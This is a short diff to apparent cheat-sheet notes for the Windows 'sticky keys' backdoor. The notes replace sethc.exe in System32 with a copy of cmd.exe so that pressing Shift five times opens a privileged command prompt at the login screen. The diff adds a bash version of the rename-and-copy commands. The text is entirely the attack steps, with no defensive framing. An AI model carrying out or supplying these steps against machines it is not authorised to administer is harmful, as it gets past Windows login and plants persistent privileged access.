@@ -1,6 +1,9 @@
 # cd C:\Windows\System32\
 rename sethc.exe sethc.exe.bak
 copy cmd.exe sethc.exe
+# or bash:
+mv sethc.exe sethc.exe.bak
+cp cmd.exe sethc.exe
 # shift 5 times
 
 # In admin cmd
